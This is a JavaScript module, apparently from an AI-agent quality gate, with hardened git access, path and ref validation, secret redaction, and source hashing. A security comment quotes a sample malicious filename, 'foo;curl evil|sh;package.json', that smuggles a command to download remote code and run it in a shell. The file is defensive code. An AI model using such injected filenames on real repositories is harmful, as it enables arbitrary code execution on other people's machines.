// harness-quality-core — shared substrate for the measured gate.
//
// Exists because three modules needed the same primitives and each grew its own copy: path
// constants, JSON reading, the source hash, git access. The router used to import the
// 882-line gate module just to reach `sourceHash` — a dependency edge created by a
// misplaced responsibility.
//
// The git port is the important part. Every fail-open bug in this system has lived in a
// composition that shells out to git, and those compositions were untestable because the
// shelling was private. `makeGit` is injectable: pass `exec` and the composition becomes a
// pure function of recorded git output.
//
// SECURITY: git runs with an argv array and NO shell. Paths are arguments, never
// interpolated into command text — a file named `foo;curl evil|sh;package.json` was
// otherwise arbitrary code execution in any repo an agent merely inspected.

import { spawnSync } from "node:child_process"
import crypto from "node:crypto"
import fs from "node:fs"
import path from "node:path"
import { fileURLToPath } from "node:url"
// Reuse, don't redefine: harness-common carries "single shared source of truth" comments about
// the last time these helpers were duplicated and drifted.
const __dirname = path.dirname(fileURLToPath(import.meta.url))
const commonModule = fs.existsSync(path.join(__dirname, "harness-common.mjs"))
  ? await import("./harness-common.mjs")
  : await import("../../../scripts/harness-common.mjs")
const { pathExists, readTextIfExists, redactSensitiveText } = commonModule

export { pathExists, readTextIfExists }

export const REPORT_DIR = path.join("docs", "harness", "quality")
export const REVIEW_DIR = path.join("docs", "harness", "review")
export const FINDINGS_DIR = path.join("docs", "harness", "findings")
export const THRESHOLDS_PATH = path.join("agent-os", "quality-thresholds.json")
export const DECISIONS_PATH = path.join("agent-os", "quality-decisions.md")

// Excluded from the source hash because the gate or the review flow writes them; including
// them would make every report instantly stale. The thresholds file is handled separately —
// see `thresholdsFingerprintInput`.
// `docs/harness/findings` is here AND ONLY HERE on purpose: findings are written AFTER the
// gate runs, so inside the hash every write would stale the fresh report and refuse the
// commit trailer — a fail-closed loop triggered by correct behaviour. Do NOT add
// `agent-os/standards/`, `docs/review.md`, `docs/harness/refine-log.md` or
// `learned-rules.json`: they stay INSIDE the hash, and the ordering (prose after the code
// commit) is what makes that survivable. Dropping the rulebook out of the hash would remove
// its only remaining detection and reproduce the `**/auth/**` TOCTOU on the rulebook.
// `docs/harness/state`, `docs/harness/judge`, `docs/harness/session-handoff.md` and the
// `docs/harness/traces` stream are the same class as `findings`: the PREVC lifecycle writes
// them AFTER the gate runs (a judge receipt, a phase transition, the operator-confirmed
// handoff, a trace event), so inside the hash any of them would stale the report
// mid-lifecycle and block Judge advancement / mark a completed lifecycle stale.
// harness-status derives its freshness check from THIS same constant, so the parity is
// structural, not duplicated.
export const GATE_ARTIFACTS = [
  REPORT_DIR,
  REVIEW_DIR,
  DECISIONS_PATH,
  FINDINGS_DIR,
  path.join("docs", "harness", "state"),
  path.join("docs", "harness", "judge"),
  path.join("docs", "harness", "session-handoff.md"),
  path.join("docs", "harness", "progress.md"),
  path.join("docs", "harness", "traces"),
]
export function isSpecEvidencePath(file) {
  const normalized = String(file ?? "").replace(/\\/g, "/")
  return /^agent-os\/specs\/[^/]+\/evidence(?:\/|$)/.test(normalized)
}

export const SOURCE_FILE_PATTERN = /\.(ts|tsx|js|jsx|mjs|cjs|py|rb|go|kt|java|vue|svelte|rs|php|cs|swift)$/i

// Ceiling for any external command. Without it a hung test runner hangs the gate, and
// therefore the agent lane, forever.
export const COMMAND_TIMEOUT_MS = 10 * 60 * 1000

export function readJsonIfExists(targetPath) {
  const text = readTextIfExists(targetPath)
  if (!text.trim()) return null
  try {
    return JSON.parse(text)
  } catch {
    return null
  }
}

// ---------------------------------------------------------------------------
// the git port

function defaultExec(root) {
  return (args) => {
    // `--literal-pathspecs` is a TOP-LEVEL git option and must precede the subcommand
    // (review B6). Git honours pathspec magic (`:(exclude)`, `:!`, `:(glob)`, a leading `:`)
    // even after `--`, so any path list derived from model-authored ticket markdown can
    // silently produce an empty result — an ownership set `:!*` would zero the detector.
    // Applying it at the real-git boundary means every path-bearing invocation inherits it
    // without each caller remembering to ask.
    const result = spawnSync("git", ["--literal-pathspecs", ...args], {
      cwd: root,
      encoding: "utf8",
      maxBuffer: 32 * 1024 * 1024,
      timeout: COMMAND_TIMEOUT_MS,
      shell: false,
    })
    return { ok: result.status === 0, code: result.status, stdout: result.stdout ?? "", stderr: result.stderr ?? "" }
  }
}

export function makeGit(root, { exec } = {}) {
  const run = exec ?? defaultExec(root)
  const text = (args) => run(args).stdout
  const ok = (args) => run(args).ok

  // -z wherever filenames come back, so a newline inside a filename cannot forge an entry.
  const nulLines = (args) =>
    text(args)
      .split("\0")
      .map((entry) => entry.trim())
      .filter(Boolean)

  return {
    run,
    ok,
    text,
    isRepo: () => ok(["rev-parse", "--is-inside-work-tree"]),
    head: () => text(["rev-parse", "HEAD"]).trim(),
    branch: () => text(["rev-parse", "--abbrev-ref", "HEAD"]).trim(),
    mergeBase: (ref) => {
      const result = run(["merge-base", "HEAD", assertValidRef(ref)])
      return result.ok ? result.stdout.trim() : null
    },
    tracked: () => nulLines(["ls-files", "-z"]),
    untracked: () => nulLines(["ls-files", "--others", "--exclude-standard", "-z"]),
    changedSince: (base) => nulLines(["diff", "--name-only", "-z", `${assertValidRef(base)}...HEAD`]),
    changedInWorktree: () => nulLines(["diff", "--name-only", "-z", "HEAD"]),
    addedOrModifiedSince: (base) => nulLines(["diff", "--name-only", "--diff-filter=AM", "-z", `${assertValidRef(base)}...HEAD`]),
    addedOrModifiedInWorktree: () => nulLines(["diff", "--name-only", "--diff-filter=AM", "-z", "HEAD"]),
    numstat: (base) => text(["diff", "--numstat", `${assertValidRef(base)}...HEAD`]) + text(["diff", "--numstat", "HEAD"]),
    logSubjects: (base) => text(["log", `${assertValidRef(base)}..HEAD`, "--format=%s%n%b"]),
    showAtBase: (base, relativePath) => {
      const result = run(["show", `${assertValidRef(base)}:${relativePath.replace(/\\/g, "/")}`])
      return result.ok ? result.stdout : null
    },
    diffPaths: (base, paths) => {
      if (!paths || paths.length === 0) return ""
      return text(["diff", `${assertValidRef(base)}...HEAD`, "--", ...paths]) + text(["diff", "HEAD", "--", ...paths])
    },
    // `--` before every path argument. Without it a file named `--cached` or `-z` is read as a
    // git OPTION rather than a path — the same class as the shell-interpolation bug, one layer
    // down: a filename reaching an argv position it must not control.
    isTracked: (relativePath) => ok(["ls-files", "--error-unmatch", "--", relativePath.replace(/\\/g, "/")]),
    // Existence in committed HISTORY, not in the index. `git rm --cached` removes a path from the
    // index while leaving it on disk and in HEAD, so an index-based "is this a fresh install?"
    // check is forgeable; a HEAD-based one is not, and committing the removal is a visible
    // deletion of a high-risk path.
    existsAtHead: (relativePath) => ok(["cat-file", "-e", `HEAD:${relativePath.replace(/\\/g, "/")}`]),
    isWorkingTreeClean: () => {
      const changed = nulLines(["diff", "--name-only", "-z", "HEAD"])
      if (changed.length > 0) return false
      const untracked = nulLines(["ls-files", "--others", "--exclude-standard", "-z"])
      const excluded = GATE_ARTIFACTS.map((artifact) => artifact.replace(/\\/g, "/"))
      const nonArtifactUntracked = untracked
        .map((f) => f.replace(/\\/g, "/"))
        .filter((file) => !isSpecEvidencePath(file))
        .filter((file) => !excluded.some((artifact) => file === artifact || file.startsWith(`${artifact}/`)))
      return nonArtifactUntracked.length === 0
    },
  }
}

// A git ref reaches a command argument; validate it rather than trusting whoever built it.
// Safe when an operator types `main`; a hazard the moment an agent derives it from a branch
// name, ticket title, or PR ref.
// No leading `-`: a ref argument sits without a `--` separator in several commands, so a ref like
// `--output=/tmp/x` would be read as a git option. Not RCE (no shell), but not the caller's call.
const REF_PATTERN = /^[A-Za-z0-9._/@^~][A-Za-z0-9._/@^~-]{0,199}$/

export function isValidRef(ref) {
  return typeof ref === "string" && REF_PATTERN.test(ref)
}

export function assertValidRef(ref) {
  if (!isValidRef(ref)) throw new Error(`unsafe git ref ${JSON.stringify(ref)} — expected ${REF_PATTERN}`)
  return ref
}

// `--label` lands in a report filename. Unsanitised it is a path-traversal primitive:
// `--label ../../../../agent/build` writes outside the report directory.
export function sanitizeLabel(label) {
  const candidate = String(label ?? "session")
  if (!/^[A-Za-z0-9._-]{1,64}$/.test(candidate) || candidate.includes("..")) {
    throw new Error(`unsafe --label ${JSON.stringify(label)} — expected 1-64 chars of [A-Za-z0-9._-] and no ".."`)
  }
  return candidate
}

// Confine a project-configured path to the repo. `commands.coverage_artifact` accepted
// `../../../..` and the gate would read and parse a file outside the tree.
export function resolveInsideRoot(root, candidate) {
  const resolved = path.resolve(root, candidate)
  const prefix = path.resolve(root) + path.sep
  return resolved === path.resolve(root) || resolved.startsWith(prefix) ? resolved : null
}

// A path list derived from model-authored markdown must not carry pathspec magic or escape
// the repo (review B6). Every entry is either accepted, or REFUSED and reported — never
// skipped: a silently dropped entry is how an ownership set `:!*` zeroes a detector.
export function validatePathEntries(entries, root) {
  const refusals = []
  const paths = []
  for (const entry of entries ?? []) {
    if (typeof entry !== "string" || entry.trim().startsWith(":")) {
      refusals.push(
        `pathspec magic refused: ${JSON.stringify(entry)} — an entry starting with ":" is a git pathspec magic marker (:! / :(exclude) / :(glob)), not a path. Reported as a refusal, never skipped (review B6)`,
      )
      continue
    }
    if (resolveInsideRoot(root, entry) === null) {
      refusals.push(`path outside the repository refused: ${JSON.stringify(entry)} (review B6)`)
      continue
    }
    paths.push(entry)
  }
  return { ok: refusals.length === 0, refusals, paths }
}

// The only way a file is allowed to be read to LOCATE something (a rule anchor, a window
// entry): `lstat` first and skip anything that is not a regular file, then `realpath` and
// re-confirm the target is still inside the root (review M12). A symlink to
// `~/.ssh/id_rsa` or `.env` must not be readable through this path. FINAL-R2: the read
// goes through the re-confirmed REAL path, not the pre-check path — between the realpath
// re-confirmation and the open, the pre-check path could be swapped for a symlink; the
// real path is the one that was verified.
export function safeReadFile(root, target) {
  const resolved = resolveInsideRoot(root, target)
  if (resolved === null) return { ok: false, reason: `${JSON.stringify(target)} is outside the repository` }
  let stat
  try {
    stat = fs.lstatSync(resolved)
  } catch {
    return { ok: false, reason: `not readable: ${JSON.stringify(target)}` }
  }
  if (!stat.isFile()) {
    return { ok: false, reason: `${JSON.stringify(target)} is not a regular file — symlinks and directories are skipped, never read (review M12)` }
  }
  let real
  try {
    real = fs.realpathSync(resolved)
  } catch {
    return { ok: false, reason: `cannot resolve real path: ${JSON.stringify(target)}` }
  }
  if (resolveInsideRoot(root, real) === null) {
    return { ok: false, reason: `${JSON.stringify(target)} resolves outside the repository — a symlink escape is refused, not followed (review M12)` }
  }
  return { ok: true, text: fs.readFileSync(real, "utf8") }
}

// ---------------------------------------------------------------------------
// redaction — reports are committed, so anything echoed into them is published

// Composes harness-common's scanner-grade redaction and adds the env-prefix form a command
// line carries (`PGPASSWORD=… npm test`), which the scanner's pattern does not cover because it
// was written for config files rather than shell invocations.
const ENV_PREFIX_PATTERN = /\b(pgpassword|mysql_pwd|aws_secret_access_key|aws_access_key_id|npm_token|gh_token|github_token)(\s*=\s*)([^\s]+)/gi

export function redact(text) {
  if (typeof text !== "string") return text
  return redactSensitiveText(text).replace(ENV_PREFIX_PATTERN, (_match, key, separator) => `${key}${separator}[REDACTED]`)
}

// ---------------------------------------------------------------------------
// the thresholds file: fingerprint, hash contribution, change description

// Every field that determines WHAT is measured or WHETHER it blocks. Guarding only
// `metrics.*.threshold` left the gate defeatable by a one-line edit needing no recorded
// decision: point `suites.regression.command` at `exit 0`, delete `"mode": "blocking"`,
// flip a `direction` from min to max, or delete a metric key outright.
export function configFingerprint(thresholds) {
  if (!thresholds) return null
  const metrics = {}
  for (const [name, config] of Object.entries(thresholds.metrics ?? {})) {
    metrics[name] = {
      threshold: config.threshold ?? null,
      direction: config.direction ?? null,
      mode: config.mode ?? null,
      speed: config.speed ?? null,
      ratchet: Boolean(config.ratchet),
      // `baseline` is deliberately NOT here. It is load-bearing (for a ratchet metric it is half
      // the bar) but the merge-base is structurally the wrong reference for it: the gate writes
      // baselines into the working tree, so a hand edit and a gate write look identical when the
      // committed version was `null`. Guarding it here classified a hand-lowered baseline as
      // "seeding" and let it through. It is guarded instead by `baselineRegressions`, which
      // compares against the gate's own previous report — the only record of what the bar was.
    }
  }
  const suites = {}
  for (const [name, suite] of Object.entries(thresholds.suites ?? {})) {
    suites[name] = { command: suite?.command ?? null, paths: [...(suite?.paths ?? [])].sort() }
  }
  return {
    phase: thresholds.phase ?? null,
    metrics,
    suites,
    commands: { ...(thresholds.commands ?? {}) },
    high_risk_paths: [...(thresholds.high_risk_paths ?? [])].sort(),
    sensitive_paths: [...(thresholds.sensitive_paths ?? [])].sort(),
    complexity_signals: thresholds.complexity_signals ?? {},
    // Anything NOT enumerated above. The function is documented as covering the whole document, but
    // it was really an allowlist — so a future top-level key (starting with `version`, the moment it
    // gains meaning) would land outside the guard silently. Catch-all instead of allowlist.
    other: Object.fromEntries(Object.entries(thresholds).filter(([key]) => !KNOWN_TOP_LEVEL_KEYS.has(key))),
  }
}

const KNOWN_TOP_LEVEL_KEYS = new Set(["phase", "metrics", "suites", "commands", "high_risk_paths", "sensitive_paths", "complexity_signals"])

export function stableStringify(value) {
  if (value === null || value === undefined || typeof value !== "object") return JSON.stringify(value ?? null)
  if (Array.isArray(value)) return `[${value.map(stableStringify).join(",")}]`
  const keys = Object.keys(value).sort()
  return `{${keys.map((key) => `${JSON.stringify(key)}:${stableStringify(value[key])}`).join(",")}}`
}

export function fingerprintHash(thresholds) {
  const fingerprint = configFingerprint(thresholds)
  if (!fingerprint) return null
  return crypto.createHash("sha256").update(stableStringify(fingerprint)).digest("hex").slice(0, 16)
}

// What the thresholds file contributes to the source hash: its configuration, baselines
// stripped. Including the raw file would self-stale every report (the gate writes
// baselines). Excluding it entirely allowed a TOCTOU: delete `**/auth/**` after a green run
// and the mandatory-review tier vanished with the report still "fresh".
export function thresholdsFingerprintInput(thresholds) {
  const fingerprint = configFingerprint(thresholds)
  if (!fingerprint) return "no-thresholds"
  // Strip `baseline` HERE and only here. It belongs in the guard (a hand-lowered baseline loosens a
  // ratchet) but must stay out of the hash: the gate writes baselines itself, so including them
  // would make every run self-stale its own report — which is what excluding the whole file was
  // trying to avoid before it opened a TOCTOU instead.
  const forHashing = {
    ...fingerprint,
    metrics: Object.fromEntries(
      Object.entries(fingerprint.metrics).map(([name, config]) => {
        const { baseline, ...rest } = config
        void baseline
        return [name, rest]
      }),
    ),
  }
  return stableStringify(forHashing)
}

// Describes how a fingerprint changed, in terms a refusal can be argued with.
export function fingerprintChanges(before, after) {
  const changes = []
  const names = new Set([...Object.keys(before?.metrics ?? {}), ...Object.keys(after?.metrics ?? {})])
  for (const name of names) {
    const old = before?.metrics?.[name]
    const now = after?.metrics?.[name]
    if (old && !now) {
      changes.push({ kind: "metric-removed", key: name, detail: `metric ${name} deleted — the row disappears entirely, it is not even unavailable` })
      continue
    }
    if (!old && now) {
      changes.push({ kind: "metric-added", key: name, detail: `metric ${name} added`, tightening: true })
      continue
    }
    for (const field of ["threshold", "direction", "mode", "speed", "ratchet"]) {
      if (stableStringify(old[field]) === stableStringify(now[field])) continue
      changes.push({
        kind: "metric-changed",
        key: `${name}.${field}`,
        detail: `${name}.${field}: ${JSON.stringify(old[field])} -> ${JSON.stringify(now[field])}`,
        tightening: isTightening(field, old, now),
      })
    }
  }
  compareCommandMap(before?.commands, after?.commands, "commands", changes)
  compareCommandMap(before?.suites, after?.suites, "suites", changes)
  comparePathSets(before?.high_risk_paths, after?.high_risk_paths, "high_risk_paths", changes)
  comparePathSets(before?.sensitive_paths, after?.sensitive_paths, "sensitive_paths", changes)
  if (stableStringify(before?.complexity_signals) !== stableStringify(after?.complexity_signals)) {
    changes.push({ kind: "signals-changed", key: "complexity_signals", detail: "complexity_signals changed — the risk router's scoring moved" })
  }
  // Everything not enumerated above. Adding `other` to the fingerprint without comparing it here
  // would have been the allowlist bug with an extra step.
  if (stableStringify(before?.other) !== stableStringify(after?.other)) {
    changes.push({
      kind: "unknown-key-changed",
      key: "other",
      detail: `an unenumerated top-level key changed: ${stableStringify(before?.other)} -> ${stableStringify(after?.other)}`,
    })
  }
  if ((before?.phase ?? null) !== (after?.phase ?? null)) {
    changes.push({
      kind: "phase-changed",
      key: "phase",
      detail: `phase ${before?.phase} -> ${after?.phase}`,
      tightening: phaseRank(after?.phase) > phaseRank(before?.phase),
    })
  }
  return changes
}

// A change that only makes the gate stricter needs no justification — ratcheting up is the
// intended direction. Everything else does.
export function loosenings(changes) {
  return changes.filter((change) => !change.tightening)
}

function isTightening(field, old, now) {
  const direction = now.direction ?? old.direction

  if (field === "threshold") {
    if (typeof old.threshold !== "number" || typeof now.threshold !== "number") return false
    return direction === "min" ? now.threshold > old.threshold : now.threshold < old.threshold
  }

  // The gate only ever moves a baseline in the improving direction, and only on a passing run.
  // So an improving move is a gate write (no justification needed) and a loosening move — or
  // removing a baseline entirely, which drops half the bar — can only be a hand edit.
  if (field === "baseline") {
    if (old.baseline === null || old.baseline === undefined) return true
    if (now.baseline === null || now.baseline === undefined) return false
    return direction === "min" ? now.baseline > old.baseline : now.baseline < old.baseline
  }

  if (field === "mode") return now.mode === "blocking"
  return false
}

// Guards `baseline` against a hand edit, using the gate's own previous report rather than the
// merge-base. The report records the effective bar it evaluated against (`row.threshold`), and the
// gate never moves a ratchet baseline in the loosening direction — so a bar that got looser than
// the last report's bar can only have been edited by hand.
// `previousBars` is a LIST of candidate prior bars per metric, from independent sources. The bar we
// compare against is the STRICTEST of them, which is what makes forgery useless: a planted report can
// only ever propose a looser bar, and a looser candidate never wins.
//
// Sources, in order of trust:
//  1. the committed thresholds file at HEAD — a git object, not forgeable without a visible commit
//  2. recorded bars from gate reports — cheap to plant (`docs/harness/quality/` is excluded from the
//     source hash), which is exactly why they can only raise the bar, never lower it
export function strictestBar(direction, candidates) {
  const numbers = candidates.filter((value) => typeof value === "number")
  if (numbers.length === 0) return null
  return direction === "min" ? Math.max(...numbers) : Math.min(...numbers)
}

export function effectiveBar(config) {
  if (config.baseline === null || config.baseline === undefined) return config.threshold
  if (!config.ratchet) return config.threshold
  return config.direction === "min" ? Math.max(config.threshold, config.baseline) : Math.min(config.threshold, config.baseline)
}

export function baselineRegressions(thresholds, previousBarsByMetric) {
  if (!previousBarsByMetric) return []
  const regressions = []
  for (const [name, config] of Object.entries(thresholds?.metrics ?? {})) {
    if (!config.ratchet) continue
    const previous = strictestBar(config.direction, previousBarsByMetric[name] ?? [])
    if (previous === null) continue
    const currentBar = effectiveBar(config)
    if (typeof currentBar !== "number") continue
    const looser = config.direction === "min" ? currentBar < previous : currentBar > previous
    if (looser) {
      regressions.push({
        kind: "baseline-regressed",
        key: `${name}.baseline`,
        detail: `${name} bar moved from ${previous} to ${currentBar} — the gate never loosens a ratchet, so this was edited by hand`,
      })
    }
  }
  return regressions
}

// Collects prior bar candidates from every source. Reports contribute but cannot lower the bar.
export function collectPreviousBars({ headThresholds, reports = [] }) {
  const byMetric = {}
  const add = (metric, value) => {
    if (typeof value !== "number") return
    byMetric[metric] = byMetric[metric] ?? []
    byMetric[metric].push(value)
  }
  for (const [name, config] of Object.entries(headThresholds?.metrics ?? {})) add(name, effectiveBar(config))
  for (const report of reports) {
    for (const row of report?.rows ?? []) add(row.metric, row.threshold)
  }
  return byMetric
}

function phaseRank(phase) {
  return { A: 0, B: 1, C: 2 }[phase] ?? -1
}

function compareCommandMap(before, after, label, changes) {
  const keys = new Set([...Object.keys(before ?? {}), ...Object.keys(after ?? {})])
  for (const key of keys) {
    const old = before?.[key] ?? null
    const now = after?.[key] ?? null
    if (stableStringify(old) === stableStringify(now)) continue
    changes.push({
      kind: label === "suites" ? "suite-changed" : "command-changed",
      key: `${label}.${key}`,
      detail: `${label}.${key}: ${JSON.stringify(old)} -> ${JSON.stringify(now)} — this command IS the measurement`,
    })
  }
}

function comparePathSets(before, after, label, changes) {
  const removed = (before ?? []).filter((entry) => !(after ?? []).includes(entry))
  const added = (after ?? []).filter((entry) => !(before ?? []).includes(entry))
  if (removed.length) {
    changes.push({ kind: "paths-removed", key: label, detail: `${label} lost ${removed.join(", ")} — those paths stop forcing review` })
  }
  if (added.length) {
    changes.push({ kind: "paths-added", key: label, detail: `${label} gained ${added.join(", ")}`, tightening: true })
  }
}

// ---------------------------------------------------------------------------
// report credibility — the shape checks every consumer needs
//
// One definition, because there were two: the gate's `isTrustworthyReport` and the router's
// `assessReport` both re-implemented "not unconfigured / verdict pass / hash present / rows
// non-empty", so a future fix to one would not have reached the other. The router adds the checks
// only it and ship-evidence need (hash match against the current tree, metric coverage).

export function checkReportShape(report) {
  if (!report) return { credible: false, reason: "report is not parseable" }
  if (report.unconfigured) return { credible: false, reason: "gate is unconfigured — it measured nothing" }
  if (report.verdict !== "pass") return { credible: false, reason: `gate verdict is ${report.verdict}` }
  if (!report.sourceHash) {
    return { credible: false, reason: "report carries no source hash — it predates hashing or was written outside a git tree" }
  }
  if (!Array.isArray(report.rows) || report.rows.length === 0) {
    return { credible: false, reason: "report has no metric rows — it measured nothing" }
  }
  return { credible: true }
}

// ---------------------------------------------------------------------------
// source hash — the definition of "stale"

const sourceHashCache = new Map()

export function sourceHash(root, { git, thresholds, fresh = false } = {}) {
  if (!fresh && !git && sourceHashCache.has(root)) return sourceHashCache.get(root)
  const value = computeSourceHash(root, git ?? makeGit(root), thresholds)
  if (!git) sourceHashCache.set(root, value)
  return value
}

export function clearSourceHashCache() {
  sourceHashCache.clear()
}

export function globToRegex(globPattern, flags = "") {
  const pattern = String(globPattern ?? "").replace(/\\/g, "/")
  let reStr = "^"
  for (let i = 0; i < pattern.length; i++) {
    const c = pattern[i]
    if (c === "*") {
      if (pattern[i + 1] === "*") {
        i++
        if (pattern[i + 1] === "/") {
          i++
          reStr += "(?:.*/)?"
        } else {
          reStr += ".*"
        }
      } else {
        reStr += "[^/]*"
      }
    } else if (c === "?") {
      reStr += "[^/]"
    } else if (".+^${}()|[]\\".includes(c)) {
      reStr += "\\" + c
    } else {
      reStr += c
    }
  }
  reStr += "$"
  return new RegExp(reStr, flags)
}

export const SAFE_RUNTIME_EXCLUDE_ALLOWLIST = new Set([
  "agent/sessions/**",
  "agent/terminal-sessions/**",
  "agent/blobs/**",
  "**/*.db",
  "**/*.db-wal",
  "**/*.db-shm",
  "logs/**",
  "cache/**",
  "agent/predict/ngram/**",
  ".maestri/roles/*/docs/harness/traces/**",
  "scratch/*.md",
  "webcache/**",
])

export const PROTECTED_PREFIXES = [
  "agent/scripts/",
  "agent/tests/",
  "agent/skills/",
  "agent/agents/",
  "agent/docs/",
  "agent/commands/",
  "agent/extensions/",
  "agent-os/",
  "docs/harness/",
]

export const PROBE_PATHS = [
  "agent/scripts/a.mjs",
  "AGENT/SCRIPTS/a.mjs",
  "agent/skills/a/SKILL.md",
  "agent/skills/a/references/b.md",
  "agent-os/x.json",
  "docs/harness/x.md",
  "src/a.ts",
  "a.mjs",
  "a.py",
  "a.md",
]

export function isPatternTargetingProtectedPath(globPattern) {
  const norm = String(globPattern ?? "").replace(/\\/g, "/").trim()
  if (norm.includes("..")) return true
  if (norm.startsWith("/")) return true
  if (norm === "*" || norm === "**") return true

  // Closed allowlist of exactly safe runtime glob patterns declared in quality-thresholds.json.
  // Any pattern not explicitly in this allowlist is refused before hashing.
  if (!SAFE_RUNTIME_EXCLUDE_ALLOWLIST.has(norm)) {
    return true
  }

  const lowerNorm = norm.toLowerCase()
  const thresholdsRelative = THRESHOLDS_PATH.replace(/\\/g, "/").toLowerCase()
  if (lowerNorm === thresholdsRelative) return true

  for (const prefix of PROTECTED_PREFIXES) {
    const lowerPrefix = prefix.toLowerCase()
    const prefixNoSlash = lowerPrefix.endsWith("/") ? lowerPrefix.slice(0, -1) : lowerPrefix
    if (lowerNorm === prefixNoSlash || lowerNorm.startsWith(lowerPrefix) || lowerNorm.startsWith(`${prefixNoSlash}/`)) {
      return true
    }
  }

  const regex = globToRegex(norm, "i")
  if (regex.test(thresholdsRelative)) return true
  for (const probe of PROBE_PATHS) {
    if (regex.test(probe)) return true
  }

  return false
}

export function checkWorkingTreeClean(git) {
  if (!git || typeof git.isRepo !== "function" || !git.isRepo()) return false
  if (typeof git.isWorkingTreeClean === "function") return Boolean(git.isWorkingTreeClean())
  const changed = typeof git.changedInWorktree === "function" ? git.changedInWorktree() : []
  if (Array.isArray(changed) && changed.length > 0) return false
  const untracked = typeof git.untracked === "function" ? git.untracked() : []
  const excluded = GATE_ARTIFACTS.map((artifact) => artifact.replace(/\\/g, "/"))
  const nonArtifactUntracked = (Array.isArray(untracked) ? untracked : [])
    .map((f) => f.replace(/\\/g, "/"))
    .filter((file) => !isSpecEvidencePath(file))
    .filter((file) => !excluded.some((artifact) => file === artifact || file.startsWith(`${artifact}/`)))
  return nonArtifactUntracked.length === 0
}

export function computeSourceHash(root, git, thresholdsOverride) {
  const g = git ?? makeGit(root)
  if (!g || typeof g.isRepo !== "function" || !g.isRepo()) return null
  const thresholds = thresholdsOverride ?? readJsonIfExists(path.join(root, THRESHOLDS_PATH))

  const excludePatterns = Array.isArray(thresholds?.source_hash_exclude)
    ? thresholds.source_hash_exclude
    : []

  const excludeRegexes = []
  for (const pattern of excludePatterns) {
    if (typeof pattern !== "string" || !pattern.trim()) continue
    const trimmed = pattern.trim()
    if (!SAFE_RUNTIME_EXCLUDE_ALLOWLIST.has(trimmed) || isPatternTargetingProtectedPath(trimmed)) {
      throw new Error(`source_hash_exclude pattern "${trimmed}" is not in the safe runtime allowlist and is refused`)
    }
    excludeRegexes.push(globToRegex(trimmed, "i"))
  }

  const excluded = GATE_ARTIFACTS.map((artifact) => artifact.replace(/\\/g, "/"))
  const thresholdsRelative = THRESHOLDS_PATH.replace(/\\/g, "/")
  const isProtectedFile = (file) => {
    const lower = file.toLowerCase()
    if (lower === thresholdsRelative.toLowerCase()) return true
    for (const prefix of PROTECTED_PREFIXES) {
      if (lower.startsWith(prefix.toLowerCase())) return true
    }
    return false
  }

  const files = [...g.tracked(), ...g.untracked()]
    .map((file) => file.replace(/\\/g, "/"))
    .filter((file) => file !== thresholdsRelative)
    .filter((file) => !isSpecEvidencePath(file))
    .filter((file) => !excluded.some((artifact) => file === artifact || file.startsWith(`${artifact}/`)))
    .filter((file) => isProtectedFile(file) || !excludeRegexes.some((re) => re.test(file)))
    .sort()

  const hash = crypto.createHash("sha256")
  for (const file of files) {
    const full = path.join(root, file)
    if (!fs.existsSync(full)) continue
    try {
      const stat = fs.statSync(full)
      if (!stat.isFile()) continue
      hash.update(file)
      hash.update(fs.readFileSync(full))
    } catch {
      hash.update(`${file}:unreadable`)
    }
  }

  hash.update(thresholdsFingerprintInput(thresholds))
  return hash.digest("hex").slice(0, 16)
}

export function normalizeLineEndings(content) {
  if (typeof content === "string") {
    return content.replace(/\r\n/g, "\n")
  }
  if (Buffer.isBuffer(content)) {
    if (content.includes(0)) return content
    return Buffer.from(content.toString("utf8").replace(/\r\n/g, "\n"), "utf8")
  }
  return content
}

export function computeNormalizedSourceHash(root, git, thresholdsOverride) {
  const g = git ?? makeGit(root)
  if (!g || typeof g.isRepo !== "function" || !g.isRepo()) return null
  const thresholds = thresholdsOverride ?? readJsonIfExists(path.join(root, THRESHOLDS_PATH))

  const excludePatterns = Array.isArray(thresholds?.source_hash_exclude)
    ? thresholds.source_hash_exclude
    : []

  const excludeRegexes = []
  for (const pattern of excludePatterns) {
    if (typeof pattern !== "string" || !pattern.trim()) continue
    const trimmed = pattern.trim()
    if (!SAFE_RUNTIME_EXCLUDE_ALLOWLIST.has(trimmed) || isPatternTargetingProtectedPath(trimmed)) {
      throw new Error(`source_hash_exclude pattern "${trimmed}" is not in the safe runtime allowlist and is refused`)
    }
    excludeRegexes.push(globToRegex(trimmed, "i"))
  }

  const excluded = GATE_ARTIFACTS.map((artifact) => artifact.replace(/\\/g, "/"))
  const thresholdsRelative = THRESHOLDS_PATH.replace(/\\/g, "/")
  const isProtectedFile = (file) => {
    const lower = file.toLowerCase()
    if (lower === thresholdsRelative.toLowerCase()) return true
    for (const prefix of PROTECTED_PREFIXES) {
      if (lower.startsWith(prefix.toLowerCase())) return true
    }
    return false
  }

  const files = [...g.tracked(), ...g.untracked()]
    .map((file) => file.replace(/\\/g, "/"))
    .filter((file) => file !== thresholdsRelative)
    .filter((file) => !isSpecEvidencePath(file))
    .filter((file) => !excluded.some((artifact) => file === artifact || file.startsWith(`${artifact}/`)))
    .filter((file) => isProtectedFile(file) || !excludeRegexes.some((re) => re.test(file)))
    .sort()

  const hash = crypto.createHash("sha256")
  for (const file of files) {
    const full = path.join(root, file)
    if (!fs.existsSync(full)) continue
    try {
      const stat = fs.statSync(full)
      if (!stat.isFile()) continue
      hash.update(file)
      const raw = fs.readFileSync(full)
      hash.update(normalizeLineEndings(raw))
    } catch {
      hash.update(`${file}:unreadable`)
    }
  }

  hash.update(normalizeLineEndings(thresholdsFingerprintInput(thresholds)))
  return hash.digest("hex").slice(0, 16)
}

export function computeReportDigest(report) {
  if (!report || typeof report !== "object") return null
  const { evidenceEnvelope, ...rest } = report
  return crypto.createHash("sha256").update(stableStringify(rest)).digest("hex").slice(0, 16)
}

export function createEvidenceEnvelope(root, { git, thresholds, report } = {}) {
  const g = git ?? makeGit(root)
  const isRepo = Boolean(g && typeof g.isRepo === "function" && g.isRepo())
  const targetCommitSha = isRepo && typeof g.head === "function" ? (g.head() || null) : null
  const sourceHashVal = isRepo ? computeSourceHash(root, g, thresholds) : null
  const normalizedSourceHash = isRepo ? computeNormalizedSourceHash(root, g, thresholds) : null
  const isClean = isRepo ? checkWorkingTreeClean(g) : false
  const reportDigest = report ? computeReportDigest(report) : null
  const timestamp = new Date().toISOString()

  return {
    target_commit_sha: targetCommitSha,
    source_hash: sourceHashVal,
    normalized_source_hash: normalizedSourceHash,
    working_tree_clean: isClean,
    report_digest: reportDigest,
    timestamp,
  }
}

